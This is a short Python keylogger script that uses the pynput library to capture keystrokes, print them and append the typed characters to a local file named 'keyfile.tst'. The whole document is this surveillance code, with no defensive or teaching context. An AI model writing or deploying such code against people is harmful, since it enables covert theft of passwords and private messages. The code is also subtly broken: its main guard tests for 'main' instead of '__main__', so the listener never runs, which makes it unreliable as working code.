from pynput import keyboard



def keypressed(key):
    print(str(key))
    with open("keyfile.tst",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__== "main":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()